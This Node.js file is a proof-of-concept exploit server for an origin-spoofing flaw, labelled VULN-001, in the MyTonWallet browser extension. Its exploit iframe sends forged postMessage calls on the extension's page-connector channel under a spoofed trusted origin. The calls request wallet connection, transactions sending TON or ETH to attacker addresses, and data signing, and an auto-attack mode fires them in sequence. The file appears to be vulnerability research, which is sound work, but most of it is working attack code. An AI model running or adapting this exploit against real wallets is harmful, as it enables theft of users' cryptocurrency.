#!/usr/bin/env node

/**
 * VULN-001 Exploit Server — Single-port version for Replit
 *
 * Все страницы доступны на одном порту:
 *   /            — parent page (главная)
 *   /trusted     — trusted dApp iframe
 *   /exploit     — exploit iframe
 *   /tonconnect-manifest.json
 *
 * После запуска откройте https://<repl>.replit.app/
 */

const http = require('http');

const PORT = process.env.PORT || 3000;

// ════════════════════════════════════════════════════════════════
// Для полноценного кросс-доменного теста нужно 3 разных origin:
//
//   Terminal 1:  ngrok http 3000   → trusted iframe
//   Terminal 2:  ngrok http 3001   → exploit iframe
//   Terminal 3:  ngrok http 3002   → parent page (Replit URL)
//
// Но на Replit можно запустить только один порт,
// поэтому parent page встраивает iframe как same-origin.
// Для настоящей проверки VULN-001 используйте ngrok + локальный запуск.
// ════════════════════════════════════════════════════════════════

const MANIFEST = JSON.stringify({
  url: "https://ton-connect.github.io/demo-dapp-with-react-ui/",
  name: "Demo dApp (VULN-001 PoC)",
  iconUrl: "https://ton-connect.github.io/demo-dapp-with-react-ui/apple-touch-icon.png",
  termsOfUseUrl: "https://ton-connect.github.io/demo-dapp-with-react-ui/terms-of-use.txt",
  privacyPolicyUrl: "https://ton-connect.github.io/demo-dapp-with-react-ui/privacy-policy.txt"
});

function servePage(res, html) {
  res.writeHead(200, {
    'Content-Type': 'text/html; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Cross-Origin-Opener-Policy': 'unsafe-none',
    'Cross-Origin-Embedder-Policy': 'unsafe-none',
  });
  res.end(html);
}

// ════════════════════════════════════════════════════════════════
// TRUSTED dApp iframe
// ════════════════════════════════════════════════════════════════

const TRUSTED_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trusted dApp — Legitimate DeFi Protocol</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: system-ui, -apple-system, sans-serif; max-width: 600px; margin: 0 auto;
           padding: 20px; background: #f0f8ff; color: #333; min-height: 100vh; }
    h1 { color: #0066cc; font-size: 24px; margin-bottom: 4px; }
    .sub { color: #666; font-size: 14px; margin-bottom: 16px; }
    .card { background: white; border-radius: 12px; padding: 16px; margin: 12px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
    .card h3 { font-size: 14px; color: #666; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
    .status { padding: 10px 14px; border-radius: 8px; font-size: 14px; font-weight: 500; }
    .status.ok { background: #d4edda; color: #155724; }
    .status.warn { background: #fff3cd; color: #856404; }
    .status.error { background: #f8d7da; color: #721c24; }
    .status.info { background: #e8f4fd; color: #0056b3; }
    code { background: #e9ecef; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
    pre { background: #1e1e2e; color: #cdd6f4; padding: 12px; border-radius: 8px;
          overflow-x: auto; font-size: 13px; margin: 8px 0; }
    .btn { border: none; padding: 10px 20px; border-radius: 8px; font-size: 15px;
           font-weight: 600; cursor: pointer; transition: opacity .15s; }
    .btn:hover { opacity: .85; }
    .btn:disabled { opacity: .4; cursor: not-allowed; }
    .btn-primary { background: #0066cc; color: white; }
    .btn-danger { background: #dc3545; color: white; }
    .btn-outline { background: transparent; color: #0066cc; border: 1.5px solid #0066cc; }
    .btn-sm { padding: 6px 12px; font-size: 13px; }
    .logo { font-size: 40px; margin-bottom: 4px; }
    .flex { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
    .mt-2 { margin-top: 12px; }
    .mb-2 { margin-bottom: 12px; }
    .tag { display: inline-block; background: #e9ecef; padding: 2px 8px; border-radius: 10px;
           font-size: 12px; color: #555; margin: 2px; }
    .addr { font-family: monospace; font-size: 13px; word-break: break-all; background: #f5f5f5;
            padding: 8px; border-radius: 6px; margin: 6px 0; }
    .actions { display: flex; gap: 8px; flex-wrap: wrap; margin: 12px 0; }
    input, select { padding: 8px 10px; border: 1.5px solid #ddd; border-radius: 6px;
                    font-size: 14px; width: 100%; }
    input:focus { outline: none; border-color: #0066cc; }
    label { font-size: 13px; color: #555; display: block; margin-bottom: 4px; }
    .row { margin: 8px 0; }
    hr { border: none; border-top: 1px solid #e0e0e0; margin: 16px 0; }
    .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px;
             font-weight: 600; }
    .badge.ok { background: #d4edda; color: #155724; }
  </style>
</head>
<body>
  <div class="flex">
    <div class="logo">\u{1F3E6}</div>
    <div>
      <h1>Trusted DeFi Protocol</h1>
      <div class="sub">Legitimate dApp — TonConnect Demo</div>
    </div>
  </div>

  <div class="status ok" id="status">\u2705 Connected to blockchain</div>

  <div class="card">
    <div class="flex mb-2">
      <span class="tag" id="originTag">origin: —</span>
      <span class="tag">TonConnect v2</span>
    </div>
    <div class="actions">
      <button class="btn btn-primary" id="connectBtn">\u{1F517} Connect Wallet</button>
      <button class="btn btn-danger btn-sm" id="disconnectBtn" style="display:none">Disconnect</button>
    </div>
  </div>

  <div class="card" id="accountCard" style="display:none">
    <h3>Connected Account</h3>
    <div class="addr" id="accountAddress">—</div>
    <div class="flex mt-2">
      <span class="tag" id="accountState">—</span>
      <span class="tag" id="walletType">—</span>
    </div>
  </div>

  <div class="card">
    <h3>Send Transaction</h3>
    <div class="row">
      <label>Recipient address</label>
      <input id="txTo" type="text" placeholder="UQ... or EQ..." value="UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
    </div>
    <div class="row">
      <label>Amount (TON)</label>
      <input id="txAmount" type="text" value="0.1">
    </div>
    <div class="row">
      <label>Comment (optional)</label>
      <input id="txComment" type="text" placeholder="Hello from trusted dApp!">
    </div>
    <button class="btn btn-primary btn-sm mt-2" id="sendBtn" disabled>Send Transaction</button>
    <div id="txResult" style="margin-top:8px;font-size:13px"></div>
  </div>

  <div class="card">
    <h3>Sign Data</h3>
    <div class="row">
      <label>Message to sign</label>
      <input id="signData" type="text" value="Hello from Trusted dApp!">
    </div>
    <button class="btn btn-outline btn-sm mt-2" id="signBtn" disabled>\u270D\uFE0F Sign Data</button>
    <div id="signResult" style="margin-top:8px;font-size:13px;word-break:break-all"></div>
  </div>

  <div class="card">
    <h3>Events Log</h3>
    <pre id="eventLog" style="max-height:150px;overflow-y:auto;font-size:12px">—</pre>
  </div>

  <script type="module">
    import TonConnect from 'https://esm.sh/@tonconnect/sdk@3.4.1';

    let connector = null;
    let unsub = null;
    let connectedAddress = null;

    document.getElementById('originTag').textContent = 'origin: ' + window.origin;

    function log(msg) {
      const el = document.getElementById('eventLog');
      const line = document.createElement('div');
      line.textContent = '[' + new Date().toISOString().slice(11, 19) + '] ' + msg;
      el.appendChild(line);
      el.scrollTop = el.scrollHeight;
    }

    function setStatus(text, className) {
      const el = document.getElementById('status');
      el.className = 'status ' + (className || 'info');
      el.textContent = text;
    }

    const manifestUrl = window.location.origin + '/tonconnect-manifest.json';
    connector = new TonConnect({ manifestUrl });
    log('TonConnect SDK initialized');

    async function tryRestore() {
      try {
        await connector.restoreConnection();
        if (connector.connected && connector.wallet) {
          onConnected(connector.wallet);
        }
      } catch {}
    }

    function onConnected(wallet) {
      const account = wallet.account;
      connectedAddress = account.address;

      document.getElementById('accountAddress').textContent = account.address;
      document.getElementById('accountCard').style.display = 'block';
      document.getElementById('connectBtn').textContent = '\u2705 Connected';
      document.getElementById('connectBtn').disabled = true;
      document.getElementById('disconnectBtn').style.display = '';
      document.getElementById('sendBtn').disabled = false;
      document.getElementById('signBtn').disabled = false;

      const network = account.chain;
      if (network) {
        document.getElementById('accountState').textContent =
          network === '-239' ? 'mainnet' : 'testnet';
      }
      const walletTypeEl = document.getElementById('walletType');
      if (walletTypeEl) {
        walletTypeEl.textContent = 'injected';
      }

      setStatus('\u2705 Connected: ' + String(account.address).slice(0, 12) + '...', 'ok');
      log('\u{1F517} Connected: ' + account.address);
      log('\uD83D\uDCE1 Chain: ' + (network === '-239' ? 'mainnet' : 'testnet'));
    }

    function onDisconnected() {
      connectedAddress = null;
      document.getElementById('accountCard').style.display = 'none';
      document.getElementById('connectBtn').textContent = '\u{1F517} Connect Wallet';
      document.getElementById('connectBtn').disabled = false;
      document.getElementById('disconnectBtn').style.display = 'none';
      document.getElementById('sendBtn').disabled = true;
      document.getElementById('signBtn').disabled = true;
      setStatus('\uD83D\uDD0C Disconnected', 'warn');
      log('\uD83D\uDD0C Disconnected');
    }

    unsub = connector.onStatusChange((wallet) => {
      if (wallet) {
        log('\uD83D\uDCE1 Wallet status changed: connected');
        onConnected(wallet);
      } else {
        log('\uD83D\uDCE1 Wallet status changed: disconnected');
        onDisconnected();
      }
    });

    async function connectWallet() {
      try {
        setStatus('\u23F3 Looking for wallets...', 'info');
        const wallets = await connector.getWallets();
        const mtw = wallets.find((w) => w.appName === 'mytonwallet') ||
                     wallets.find((w) => w.jsBridgeKey === 'mytonwallet') ||
                     wallets[0];

        if (!mtw) {
          setStatus('\u274C No compatible wallet found', 'error');
          log('\u274C getWallets() returned: ' + JSON.stringify(wallets.map(w => w.appName)));
          return;
        }

        log('\uD83D\uDD0D Found wallet: ' + mtw.appName + ' (' + mtw.name + ')');
        setStatus('\u23F3 Connecting to ' + mtw.appName + '...', 'info');

        await connector.connect(mtw);
        log('\u2705 Connect request sent');
      } catch (e) {
        setStatus('\u26A0\uFE0F ' + (e.message || e), 'warn');
        log('\u274C Connect error: ' + (e.message || e));
      }
    }

    async function sendTransaction() {
      const to = document.getElementById('txTo').value.trim();
      const amount = document.getElementById('txAmount').value.trim();
      const comment = document.getElementById('txComment').value.trim();

      if (!to || !amount) { document.getElementById('txResult').textContent = '\u274C Fill recipient and amount'; return; }
      if (!connector || !connector.connected) {
        document.getElementById('txResult').textContent = '\u274C Not connected';
        return;
      }

      const messages = [{
        address: to,
        amount: (parseFloat(amount) * 1e9).toString(),
        payload: comment ? btoa(comment) : undefined,
      }];

      try {
        document.getElementById('txResult').textContent = '\u23F3 Requesting transaction...';
        const result = await connector.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 600,
          messages,
        });
        const boc = result?.boc || JSON.stringify(result);
        document.getElementById('txResult').textContent = '\u2705 Sent! boc: ' + String(boc).slice(0, 60) + '...';
        log('\uD83D\uDCB8 Transaction sent to ' + to.slice(0, 10) + '...');
      } catch (e) {
        document.getElementById('txResult').textContent = '\u274C Error: ' + (e.message || e);
        log('\u274C TX error: ' + (e.message || e));
      }
    }

    async function signData() {
      const data = document.getElementById('signData').value;
      if (!data) { document.getElementById('signResult').textContent = '\u274C Enter data to sign'; return; }
      if (!connector || !connector.connected) {
        document.getElementById('signResult').textContent = '\u274C Not connected';
        return;
      }

      try {
        document.getElementById('signResult').textContent = '\u23F3 Requesting signature...';
        const result = await connector.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 600,
          messages: [{
            address: connector.wallet.account.address,
            amount: '1',
            payload: btoa(data),
          }],
        });
        const sig = result?.boc || JSON.stringify(result);
        document.getElementById('signResult').textContent = '\u2705 Signature: ' + String(sig).slice(0, 80) + '...';
        log('\u270D\uFE0F Data signed (via transaction payload)');
      } catch (e) {
        document.getElementById('signResult').textContent = '\u274C Error: ' + (e.message || e);
        log('\u274C Sign error: ' + (e.message || e));
      }
    }

    function disconnectWallet() {
      if (connector && connector.connected) {
        connector.disconnect().catch(() => {});
      }
      onDisconnected();
    }

    document.getElementById('connectBtn').addEventListener('click', connectWallet);
    document.getElementById('disconnectBtn').addEventListener('click', disconnectWallet);
    document.getElementById('sendBtn').addEventListener('click', sendTransaction);
    document.getElementById('signBtn').addEventListener('click', signData);
    tryRestore();
  </script>
</body>
</html>`;

// ════════════════════════════════════════════════════════════════
// EXPLOIT iframe
// ════════════════════════════════════════════════════════════════

const EXPLOIT_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>[ATTACKER] — Exploit Iframe</title>
  <style>
    body { font-family: monospace; max-width: 600px; margin: 40px auto; padding: 20px;
           background: #2d1b1b; color: #ff6b6b; border: 2px solid #ff6b6b; border-radius: 12px; }
    h1 { color: #ff4444; text-align: center; }
    h2 { color: #ffa500; }
    .exploit { background: #1a1a2e; padding: 15px; border-radius: 8px; margin: 10px 0;
               border-left: 4px solid #ff6b6b; font-size: 13px; }
    .success { background: #1a2e1a; border-left-color: #4caf50; color: #81c784; }
    .info { color: #aaa; font-size: 14px; }
    .counter { font-size: 24px; font-weight: bold; color: #ff6b6b; }
    pre { background: #0a0a1a; padding: 10px; border-radius: 6px; overflow-x: auto; }
    #log { margin-top: 15px; max-height: 300px; overflow-y: auto; font-size: 12px; }
    .log-entry { padding: 3px 0; border-bottom: 1px solid #333; }
    .log-entry.sent { color: #ff6b6b; }
    .log-entry.success { color: #4caf50; }
    .badge { display: inline-block; background: #ff6b6b; color: white; padding: 2px 8px;
             border-radius: 10px; font-size: 12px; margin-left: 8px; }
  </style>
</head>
<body>
  <h1>\uD83D\uDCA0 EXPLOIT iframe <span class="badge">VULN-001</span></h1>
  <p class="info">This iframe simulates an attacker's code running on a different origin.
  It sends postMessage to the PARENT window with the <code>MyTonWallet_pageConnector</code>
  channel. The content script on the parent page will forward these messages to the
  extension service worker WITHOUT checking the origin.</p>

  <div class="exploit" id="status">
    <strong>\u26A0\uFE0F Origin:</strong> <span id="origin">—</span><br>
    <strong>Target channel:</strong> <code>MyTonWallet_pageConnector</code><br>
    <strong>Attacks sent:</strong> <span class="counter" id="count">0</span>
  </div>

  <h2>Attack Controls</h2>
  <div style="display:flex;gap:8px;flex-wrap:wrap;margin:12px 0">
    <button id="btnConnect" class="btn" style="background:#dc3545;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600">\uD83D\uDC80 Send Connect</button>
    <button id="btnTx" class="btn" style="background:#dc3545;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600">\uD83D\uDC80 Send Transaction</button>
    <button id="btnSign" class="btn" style="background:#dc3545;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600">\uD83D\uDC80 Sign Data</button>
    <button id="btnAuto" class="btn" style="background:#ffa500;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600">\u25B6 Auto Attack (3s)</button>
  </div>

  <h2>Attack Methods</h2>
  <div class="exploit">
    <strong>1. tonConnect_connect</strong> — Spoofs connection request<br>
    <pre>window.parent.postMessage({
  channel: 'MyTonWallet_pageConnector',
  type: 'callMethod',
  name: 'tonConnect_connect',
  args: [{
    url: '<span id="spoofDisplay">TRUSTED_ORIGIN</span>',
    isUrlEnsured: true
  }]
}, '*');</pre>
  </div>

  <div class="exploit">
    <strong>2. tonConnect_sendTransaction</strong> — Sends fake transaction<br>
    <pre>window.parent.postMessage({
  channel: 'MyTonWallet_pageConnector',
  type: 'callMethod',
  name: 'tonConnect_sendTransaction',
  args: [{
    url: '<span id="spoofDisplay2">TRUSTED_ORIGIN</span>',
    isUrlEnsured: true,
    payload: { to: 'attacker-wallet', amount: '1000000000' }
  }]
}, '*');</pre>
  </div>

  <div class="exploit">
    <strong>3. tonConnect_signData</strong> — Signs arbitrary data<br>
    <pre>window.parent.postMessage({
  channel: 'MyTonWallet_pageConnector',
  type: 'callMethod',
  name: 'tonConnect_signData',
  args: [{
    url: '<span id="spoofDisplay3">TRUSTED_ORIGIN</span>',
    isUrlEnsured: true,
    payload: { data: '0xdeadbeef' }
  }]
}, '*');</pre>
  </div>

  <div id="log"></div>

  <script>
    const CHANNEL = 'MyTonWallet_pageConnector';
    document.getElementById('origin').textContent = window.origin;

    const SPOOF_ORIGIN = new URLSearchParams(window.location.search).get('spoof')
      || window.location.origin;

    for (const id of ['spoofDisplay', 'spoofDisplay2', 'spoofDisplay3']) {
      const el = document.getElementById(id);
      if (el) el.textContent = SPOOF_ORIGIN;
    }

    const logEl = document.getElementById('log');
    const countEl = document.getElementById('count');
    let sentCount = 0;

    function log(msg, type) {
      const entry = document.createElement('div');
      entry.className = 'log-entry ' + type;
      entry.textContent = '[' + new Date().toISOString().slice(11, 19) + '] ' + msg;
      logEl.appendChild(entry);
      logEl.scrollTop = logEl.scrollHeight;
    }

    function sendAttack(name, args) {
      const message = {
        channel: CHANNEL,
        type: 'callMethod',
        name: name,
        args: args
      };
      window.parent.postMessage(message, '*');
      sentCount++;
      countEl.textContent = sentCount;
      log('\uD83D\uDD25 SENT: ' + name + ' (#' + sentCount + ')', 'sent');
    }

    let autoTimer = null;

    function attackConnect() {
      sendAttack('tonConnect_connect', [{
        url: SPOOF_ORIGIN,
        protocolType: 'tonConnect',
        transport: 'extension',
        protocolData: {
          manifestUrl: SPOOF_ORIGIN + '/tonconnect-manifest.json',
          items: [{ name: 'ton_addr' }]
        },
        permissions: { isPasswordRequired: false, isAddressRequired: true },
        requestedChains: [{ chain: 'ton', network: 'mainnet' }]
      }, 1]);
    }

    function attackSendTransaction() {
      sendAttack('tonConnect_sendTransaction', [{
        url: SPOOF_ORIGIN,
        protocolType: 'tonConnect',
        transport: 'extension',
        protocolData: {
          messages: [{
            address: 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
            amount: '1000000000',
            payload: null
          }],
          validUntil: Date.now() + 600000
        }
      }]);
    }

    function attackSignData() {
      sendAttack('tonConnect_signData', [{
        url: SPOOF_ORIGIN,
        protocolType: 'tonConnect',
        transport: 'extension',
        protocolData: {
          payload: '0xdeadbeef',
          from: 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
        }
      }]);
    }

    function attackWalletConnect() {
      sendAttack('walletConnect_sendTransaction', [{
        url: SPOOF_ORIGIN,
        protocolType: 'walletConnect',
        transport: 'extension',
        payload: {
          method: 'eth_sendTransaction',
          params: [{
            from: '0x0000000000000000000000000000000000000000',
            to: '0xattacker00000000000000000000000000000000',
            value: '0xde0b6b3a7640000',
            data: '0x'
          }]
        }
      }]);
    }

    function attackPrepareTransaction() {
      sendAttack('prepareTransaction', [{
        url: SPOOF_ORIGIN,
        toAddress: 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
        amount: '100000000',
        comment: 'Pay for invoice #1234'
      }]);
    }

    function runAutoAttack() {
      if (autoTimer) {
        clearTimeout(autoTimer);
        autoTimer = null;
        document.getElementById('btnAuto').textContent = '\u25B6 Auto Attack (3s)';
        log('\u23F9 Auto attack stopped', 'info');
        return;
      }
      document.getElementById('btnAuto').textContent = '\u23F9 Stop Auto';
      log('\u25B6 Auto attack started', 'info');
      attackConnect();
      setTimeout(attackSendTransaction, 1000);
      setTimeout(attackSignData, 2000);
      setTimeout(attackWalletConnect, 3000);
      setTimeout(attackPrepareTransaction, 4000);
      setTimeout(() => {
        autoTimer = null;
        document.getElementById('btnAuto').textContent = '\u25B6 Auto Attack (3s)';
        log('\u2705 Auto attack complete', 'success');
      }, 5000);
    }

    document.getElementById('btnConnect').addEventListener('click', attackConnect);
    document.getElementById('btnTx').addEventListener('click', attackSendTransaction);
    document.getElementById('btnSign').addEventListener('click', attackSignData);
    document.getElementById('btnAuto').addEventListener('click', runAutoAttack);

    log('\u26A1 Exploit iframe loaded. Use buttons to send attacks.', 'info');
    log('\uD83C\uDFAF Target channel: ' + CHANNEL, 'info');
    log('\uD83D\uDD34 My origin: ' + window.origin, 'info');
  </script>
</body>
</html>`;

// ════════════════════════════════════════════════════════════════
// PARENT page
// ════════════════════════════════════════════════════════════════

const PARENT_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VULN-001 PoC — Origin Spoofing</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
           background: #0f0f1a; color: #e0e0e0; padding: 20px; line-height: 1.5; }
    h1 { color: #ff6b6b; margin-bottom: 5px; }
    h2 { color: #ffa500; margin: 20px 0 10px; font-size: 18px; }
    .subtitle { color: #888; margin-bottom: 20px; font-size: 14px; }
    .info-panel { background: #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 20px;
                  border: 1px solid #333; }
    .badge { display: inline-block; padding: 3px 10px; border-radius: 12px;
             font-size: 12px; font-weight: bold; margin-right: 5px; }
    .badge.critical { background: #ff6b6b; color: white; }
    .badge.info { background: #0066cc; color: white; }
    .badge.green { background: #4caf50; color: white; }
    .iframe-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 15px; }
    .iframe-container { background: white; border-radius: 12px; overflow: hidden; }
    .iframe-container.trusted { border: 2px solid #4caf50; }
    .iframe-container.exploit { border: 2px solid #ff6b6b; }
    .iframe-header { padding: 8px 12px; font-size: 13px; font-weight: bold; color: white;
                     display: flex; justify-content: space-between; align-items: center; }
    .iframe-header.trusted { background: #4caf50; }
    .iframe-header.exploit { background: #ff6b6b; }
    .iframe-header .origin { font-weight: normal; font-size: 11px; opacity: 0.8; }
    iframe { width: 100%; height: 500px; border: none; display: block; }
    .status-panel { background: #1a1a2e; border-radius: 12px; padding: 20px; margin-top: 20px;
                    border: 1px solid #333; }
    .status-row { display: flex; justify-content: space-between; padding: 8px 0;
                  border-bottom: 1px solid #2a2a3e; font-size: 14px; }
    .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 6px; }
    .status-dot.green { background: #4caf50; }
    .status-dot.red { background: #ff6b6b; }
    .status-dot.yellow { background: #ffa500; }
    .status-dot.gray { background: #666; }
    .config-panel { background: #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 20px;
                    border: 1px solid #333; }
    .config-panel input { width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #444;
                          background: #0a0a1a; color: white; font-family: monospace; font-size: 13px; }
    .config-panel label { display: block; margin: 8px 0 4px; font-size: 13px; color: #aaa; }
    #exploitLog { max-height: 200px; overflow-y: auto; font-size: 12px; font-family: monospace; }
    #exploitLog .log-line { padding: 3px 0; border-bottom: 1px solid #1a1a1a; }
    #exploitLog .log-line.warn { color: #ff6b6b; }
    #exploitLog .log-line.ok { color: #4caf50; }
    .status-value { font-family: monospace; font-size: 13px; }
    .warning-box { background: #3a1a1a; border: 1px solid #ff6b6b; border-radius: 8px;
                   padding: 15px; margin: 15px 0; color: #ff6b6b; }
    @media (max-width: 900px) { .iframe-grid { grid-template-columns: 1fr; } }
  </style>
</head>
<body>
  <h1>\u26A0 VULN-001: Origin Spoofing PoC</h1>
  <div class="subtitle">Cross-Origin postMessage to MyTonWallet Extension Content Script</div>

  <div class="config-panel">
    <h2>\u2699\uFE0F Configuration</h2>
    <label>Parent Origin</label>
    <input id="parentOrigin" readonly>
    <label>Trusted dApp URL (passed to exploit as ?spoof=)</label>
    <input id="cfgTrusted" readonly>
    <label>Exploit URL</label>
    <input id="cfgExploit" readonly>
  </div>

  <div class="warning-box">
    <strong>\u26A0\uFE0F To demonstrate VULN-001, you need 3 different origins.</strong><br>
    Run ngrok on 3 terminals pointing to your local server, or deploy each page to a different hosting.<br>
    <small>Current setup: same-origin (all pages from same server). For cross-origin test, use ngrok.</small>
  </div>

  <div class="iframe-grid">
    <div class="iframe-container trusted">
      <div class="iframe-header trusted">
        \u2705 Trusted dApp
        <span class="origin" id="trustedOrigin">—</span>
      </div>
      <iframe src="/trusted" id="trustedFrame" sandbox="allow-scripts allow-same-origin allow-popups"></iframe>
    </div>

    <div class="iframe-container exploit">
      <div class="iframe-header exploit">
        \uD83D\uDCA0 Exploit iframe
        <span class="origin" id="exploitOrigin">—</span>
      </div>
      <iframe src="/exploit" id="exploitFrame" sandbox="allow-scripts allow-same-origin allow-popups"></iframe>
    </div>
  </div>

  <div class="status-panel">
    <h2>\uD83D\uDCCA Status</h2>
    <div class="status-row">
      <span>Extension Detected</span>
      <span id="extensionStatus"><span class="status-dot gray"></span> Checking...</span>
    </div>
    <div class="status-row">
      <span>Content Script Active</span>
      <span id="contentScriptStatus"><span class="status-dot gray"></span> —</span>
    </div>
    <div class="status-row">
      <span>Exploit iframe Activity</span>
      <span id="exploitStatus"><span class="status-dot gray"></span> Waiting for messages...</span>
    </div>
    <div class="status-row">
      <span>Forwarded Messages</span>
      <span class="status-value" id="forwardedCount">0</span>
    </div>
    <div class="status-row" style="border-bottom:none">
      <span>Vulnerability Status</span>
      <span id="vulnStatus"><span class="status-dot gray"></span> Waiting...</span>
    </div>
    <h2 style="margin-top:20px">Forwarded Messages Log</h2>
    <div id="exploitLog"><em style="color:#666">No messages yet</em></div>
  </div>

  <script>
    let extensionDetected = false;
    let forwardedMessages = 0;

    document.getElementById('parentOrigin').value = window.origin;
    document.getElementById('trustedOrigin').textContent = window.origin;
    document.getElementById('exploitOrigin').textContent = window.origin;

    const trustedUrl = new URLSearchParams(window.location.search).get('trusted') || '/trusted';
    const exploitUrl = new URLSearchParams(window.location.search).get('exploit') || '/exploit';
    const spoofOrigin = trustedUrl.startsWith('http') ? trustedUrl : window.origin;

    document.getElementById('cfgTrusted').value = trustedUrl;
    document.getElementById('cfgExploit').value = exploitUrl;

    document.getElementById('trustedFrame').src = trustedUrl + (trustedUrl.includes('?') ? '&' : '?') + 'spoof=' + encodeURIComponent(spoofOrigin);
    document.getElementById('exploitFrame').src = exploitUrl + (exploitUrl.includes('?') ? '&' : '?') + 'spoof=' + encodeURIComponent(spoofOrigin);

    function checkExtension() {
      const el = document.getElementById('extensionStatus');
      try {
        if (window.mytonwallet || window.tonwallet) {
          extensionDetected = true;
          el.innerHTML = '<span class="status-dot green"></span> MyTonWallet detected!';
        } else {
          el.innerHTML = '<span class="status-dot yellow"></span> Not detected (may need extension installed)';
        }
      } catch(e) {
        el.innerHTML = '<span class="status-dot yellow"></span> Check blocked by CSP';
      }
    }

    window.addEventListener('message', (e) => {
      if (e.data?.channel === 'MyTonWallet_pageConnector') {
        forwardedMessages++;
        document.getElementById('forwardedCount').textContent = forwardedMessages;

        const log = document.getElementById('exploitLog');
        if (forwardedMessages === 1) log.innerHTML = '';
        const line = document.createElement('div');
        line.className = 'log-line warn';
        line.textContent = '\uD83D\uDD34 [' + new Date().toISOString().slice(11, 19) + '] ' +
          'Content script FORWARDED message: ' + e.data.name +
          ' (origin: ' + e.origin + ')';
        log.appendChild(line);
        log.scrollTop = log.scrollHeight;

        document.getElementById('exploitStatus').innerHTML =
          '<span class="status-dot red"></span> \uD83D\uDD34 VULNERABLE: Message from origin "' +
          e.origin + '" forwarded to extension SW!';

        document.getElementById('vulnStatus').innerHTML =
          '<br><strong style="color:#ff6b6b">\uD83D\uDD34 VULN-01 CONFIRMED: Cross-origin message forwarded by content script</strong>';
      }
    });

    setTimeout(checkExtension, 1000);
    setTimeout(() => {
      document.getElementById('contentScriptStatus').innerHTML =
        '<span class="status-dot green"></span> Page scripts executing';
    }, 1500);
  </script>
</body>
</html>`;

// ════════════════════════════════════════════════════════════════
// Server
// ════════════════════════════════════════════════════════════════

const ROUTES = {
  '/': PARENT_PAGE,
  '/parent.html': PARENT_PAGE,
  '/trusted': TRUSTED_PAGE,
  '/exploit': EXPLOIT_PAGE,
  '/tonconnect-manifest.json': MANIFEST,
};

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Cross-Origin-Opener-Policy', 'unsafe-none');
  res.setHeader('Cross-Origin-Embedder-Policy', 'unsafe-none');

  const url = new URL(req.url, 'http://localhost');
  const pathname = url.pathname;
  const page = ROUTES[pathname];

  if (page) {
    const contentType = pathname.endsWith('.json')
      ? 'application/json; charset=utf-8'
      : 'text/html; charset=utf-8';
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(page);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found: ' + pathname);
  }
});

server.listen(PORT, () => {
  console.log('===========================================');
  console.log('  VULN-001 PoC Server (single-port mode)');
  console.log('===========================================');
  console.log('  Open:        http://localhost:' + PORT);
  console.log('');
  console.log('  Pages:');
  console.log('    /                — Parent page (main)');
  console.log('    /trusted         — Trusted dApp iframe');
  console.log('    /exploit         — Exploit iframe');
  console.log('    /tonconnect-manifest.json');
  console.log('');
  console.log('  For cross-origin test, use ngrok + local server:');
  console.log('    node vulns/check/server.js  (3-port mode)');
  console.log('===========================================');
});
